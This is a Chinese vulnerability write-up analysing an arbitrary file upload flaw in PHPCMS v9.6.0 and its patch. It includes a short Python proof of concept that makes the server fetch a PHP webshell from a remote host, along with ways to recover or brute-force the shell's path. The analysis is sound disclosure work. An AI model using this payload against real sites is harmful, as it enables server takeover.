> 原文链接: https://www.anquanke.com//post/id/85879 


# 【漏洞分析】PHPCMS v9.6.0 任意文件上传漏洞分析（已有补丁）


                                阅读量   
                                **124162**
                            
                        |
                        
                                                                                    



**<strong style="font-size: 18px;text-align: center">[![](https://p2.ssl.qhimg.com/t0130581a9909d7784c.png)](https://p2.ssl.qhimg.com/t0130581a9909d7784c.png)**</strong>

**<br>**

**Author: p0wd3r （知道创宇404安全实验室）**

**<br>**

**0x00 漏洞概述**

**漏洞简介**

前几天 phpcms v9.6 的任意文件上传的漏洞引起了安全圈热议，通过该漏洞攻击者可以在未授权的情况下任意文件上传，影响不容小觑。phpcms官方今天发布了9.6.1版本，对漏洞进行了补丁修复。

**漏洞影响**

任意文件上传

<br>

**0x01 漏洞复现**

本文从 PoC 的角度出发，逆向的还原漏洞过程，若有哪些错误的地方，还望大家多多指教。

首先我们看简化的 PoC ：



```
import re  
import requests
def poc(url):  
    u = '`{``}`/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1'.format(url)
    data = `{`
        'siteid': '1',
        'modelid': '1',
        'username': 'test',
        'password': 'testxx',
        'email': 'test@test.com',
        'info[content]': '&lt;img src=http://url/shell.txt?.php#.jpg&gt;',
        'dosubmit': '1',
    `}`
    rep = requests.post(u, data=data)
    shell = ''
    re_result = re.findall(r'&amp;lt;img src=(.*)&amp;gt', rep.content)
    if len(re_result):
        shell = re_result[0]
        print shell
```

可以看到 PoC 是发起注册请求，对应的是phpcms/modules/member/index.php中的register函数，所以我们在那里下断点，接着使用 PoC 并开启动态调试，在获取一些信息之后，函数走到了如下位置：

[![](https://p4.ssl.qhimg.com/t014a664f9628ad5536.png)](https://p4.ssl.qhimg.com/t014a664f9628ad5536.png)

通过 PoC 不难看出我们的 payload 在$_POST['info']里，而这里对$_POST['info']进行了处理，所以我们有必要跟进。

在使用new_html_special_chars对&lt;&gt;进行编码之后，进入$member_input-&gt;get函数，该函数位于caches/caches_model/caches_data/member_input.class.php中，接下来函数走到如下位置：

[![](https://p1.ssl.qhimg.com/t0101f989be747d2dfc.png)](https://p1.ssl.qhimg.com/t0101f989be747d2dfc.png)

由于我们的 payload 是info[content]，所以调用的是editor函数，同样在这个文件中：

[![](https://p2.ssl.qhimg.com/t014ffb22ec8368075a.png)](https://p2.ssl.qhimg.com/t014ffb22ec8368075a.png)

接下来函数执行$this-&gt;attachment-&gt;download函数进行下载，我们继续跟进，在phpcms/libs/classes/attachment.class.php中：



```
function download($field, $value,$watermark = '0',$ext = 'gif|jpg|jpeg|bmp|png', $absurl = '', $basehref = '')  
`{`
    global $image_d;
    $this-&gt;att_db = pc_base::load_model('attachment_model');
    $upload_url = pc_base::load_config('system','upload_url');
    $this-&gt;field = $field;
    $dir = date('Y/md/');
    $uploadpath = $upload_url.$dir;
    $uploaddir = $this-&gt;upload_root.$dir;
    $string = new_stripslashes($value);
    if(!preg_match_all("/(href|src)=(["|']?)([^ "'&gt;]+.($ext))\2/i", $string, $matches)) return $value;
    $remotefileurls = array();
    foreach($matches[3] as $matche)
    `{`
        if(strpos($matche, '://') === false) continue;
        dir_create($uploaddir);
        $remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref);
    `}`
    unset($matches, $string);
    $remotefileurls = array_unique($remotefileurls);
    $oldpath = $newpath = array();
    foreach($remotefileurls as $k=&gt;$file) `{`
        if(strpos($file, '://') === false || strpos($file, $upload_url) !== false) continue;
        $filename = fileext($file);
        $file_name = basename($file);
        $filename = $this-&gt;getname($filename);
        $newfile = $uploaddir.$filename;
        $upload_func = $this-&gt;upload_func;
        if($upload_func($file, $newfile)) `{`
            $oldpath[] = $k;
            $GLOBALS['downloadfiles'][] = $newpath[] = $uploadpath.$filename;
            @chmod($newfile, 0777);
            $fileext = fileext($filename);
            if($watermark)`{`
                watermark($newfile, $newfile,$this-&gt;siteid);
            `}`
            $filepath = $dir.$filename;
            $downloadedfile = array('filename'=&gt;$filename, 'filepath'=&gt;$filepath, 'filesize'=&gt;filesize($newfile), 'fileext'=&gt;$fileext);
            $aid = $this-&gt;add($downloadedfile);
            $this-&gt;downloadedfiles[$aid] = $filepath;
        `}`
    `}`
    return str_replace($oldpath, $newpath, $value);
`}`
```

函数中先对$value中的引号进行了转义，然后使用正则匹配：



```
$ext = 'gif|jpg|jpeg|bmp|png';
...
$string = new_stripslashes($value);
if(!preg_match_all("/(href|src)=(["|']?)([^ "'&gt;]+.($ext))\2/i",$string, $matches)) return $value;
```

这里正则要求输入满足src/href=url.(gif|jpg|jpeg|bmp|png)，我们的 payload （&lt;img src=http://url/shell.txt?.php#.jpg&gt;）符合这一格式（这也就是为什么后面要加.jpg的原因）。

接下来程序使用这行代码来去除 url 中的锚点：$remotefileurls[$matche] = $this-&gt;fillurl($matche, $absurl, $basehref);，处理过后$remotefileurls的内容如下：

[![](https://p4.ssl.qhimg.com/t01e3fd75f0607c5b3b.png)](https://p4.ssl.qhimg.com/t01e3fd75f0607c5b3b.png)

可以看到#.jpg被删除了，正因如此，下面的$filename = fileext($file);取的的后缀变成了php，这也就是 PoC 中为什么要加#的原因：把前面为了满足正则而构造的.jpg过滤掉，使程序获得我们真正想要的php文件后缀。

我们继续执行：

[![](https://p2.ssl.qhimg.com/t01d828578d36b2a555.png)](https://p2.ssl.qhimg.com/t01d828578d36b2a555.png)

程序调用copy函数，对远程的文件进行了下载，此时我们从命令行中可以看到文件已经写入了：

[![](https://p2.ssl.qhimg.com/t015f16f10acd5bb7c2.png)](https://p2.ssl.qhimg.com/t015f16f10acd5bb7c2.png)

shell 已经写入，下面我们就来看看如何获取 shell 的路径，程序在下载之后回到了register函数中：

[![](https://p0.ssl.qhimg.com/t0168010ac7f0e424b6.png)](https://p0.ssl.qhimg.com/t0168010ac7f0e424b6.png)

可以看到当$status &gt; 0时会执行 SQL 语句进行 INSERT 操作，具体执行的语句如下：

[![](https://p2.ssl.qhimg.com/t01e16abdd744e2d50b.png)](https://p2.ssl.qhimg.com/t01e16abdd744e2d50b.png)

也就是向v9_member_detail的content和userid两列插入数据，我们看一下该表的结构：

[![](https://p5.ssl.qhimg.com/t01abd6b7c4bbbb14ac.png)](https://p5.ssl.qhimg.com/t01abd6b7c4bbbb14ac.png)

因为表中并没有content列，所以产生报错，从而将插入数据中的 shell 路径返回给了我们：

[![](https://p0.ssl.qhimg.com/t01cbf87ec45299c5f5.png)](https://p0.ssl.qhimg.com/t01cbf87ec45299c5f5.png)

上面我们说过返回路径是在$status &gt; 0时才可以，下面我们来看看什么时候$status &lt;= 0，在phpcms/modules/member/classes/client.class.php中：

[![](https://p5.ssl.qhimg.com/t01e929fa9d2acf8378.png)](https://p5.ssl.qhimg.com/t01e929fa9d2acf8378.png)

几个小于0的状态码都是因为用户名和邮箱，所以在 payload 中用户名和邮箱要尽量随机。

另外在 phpsso 没有配置好的时候$status的值为空，也同样不能得到路径。

在无法得到路径的情况下我们只能爆破了，爆破可以根据文件名生成的方法来爆破：

[![](https://p2.ssl.qhimg.com/t0185d488ee79b727dc.png)](https://p2.ssl.qhimg.com/t0185d488ee79b727dc.png)

仅仅是时间加上三位随机数，爆破起来还是相对容易些的。

<br>

**0x02 补丁分析**

phpcms 今天发布了9.6.1版本，针对该漏洞的具体补丁如下：

[![](https://p3.ssl.qhimg.com/t012ed6bf26eccb60ee.png)](https://p3.ssl.qhimg.com/t012ed6bf26eccb60ee.png)

在获取文件扩展名后再对扩展名进行检测

<br>

**0x03 参考**

[https://www.seebug.org/vuldb/ssvid-92930](https://www.seebug.org/vuldb/ssvid-92930)

[[漏洞预警]PHPCMSv9前台GetShell (2017/04/09)](https://mp.weixin.qq.com/s?__biz=MzIyNTA1NzAxOA==&amp;mid=2650473914&amp;idx=1&amp;sn=9eb94f27c121709d837c3e4df07cc7f8&amp;pass_ticket=41uQwVrah%2B7ri0tXROEWobgq0%2BWtquBSape7MYFkD8RoRn8cVYczGKQcP%2BtCq2Jp)
